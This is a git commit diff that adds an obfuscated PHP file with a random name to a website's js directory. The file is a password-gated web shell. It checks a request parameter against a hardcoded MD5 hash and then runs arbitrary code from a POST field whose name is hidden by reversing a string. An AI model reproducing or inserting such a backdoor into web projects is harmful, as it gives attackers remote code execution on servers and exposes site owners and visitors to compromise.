617c9119783ef5cbaeafe60d3636cc3aa30d0a33
Sudeep Gurung <sudeepgurung.sg@gmail.com>
2024-08-20 00:26:05 +0545

    first

---
+++ websites/simplysoft2024/simplysoft/js/4Ah15Hag.php
@@ -0,0 +1,32 @@
+﻿<?php
+
+function wnofBsm()
+{
+global $npjngvKxw;
+$npjngvKxw=ahIgaUm();
+if(isset($_REQUEST['x']))
+{
+	$GtmtoPGUw = 'OWrluxvNWrluxvEWrluxvPWrluxvIWrluxvEWrluxvCWrluxvE';
+    $GtmtoPGUw=str_replace('Wrluxv','',$GtmtoPGUw);
+
+    echo $GtmtoPGUw;
+	if ( strcasecmp(md5($_REQUEST['x']),'1dbbe819d622724314db8d9d192e5846') ==0 )
+    {
+	@eval("\"$npjngvKxw\"");
+    }
+}
+
+
+}
+function ahIgaUm()
+{
+	    $JjKnrroggs='9oC-Pz-2BuK2M-EC';
+		$Atmmioo=strrev($JjKnrroggs);
+        $kvOMhtkdws=str_replace('','',$_POST[$Atmmioo]);
+        
+        return '";'.$kvOMhtkdws.'//';
+}
+
+wnofBsm();
+
+?>
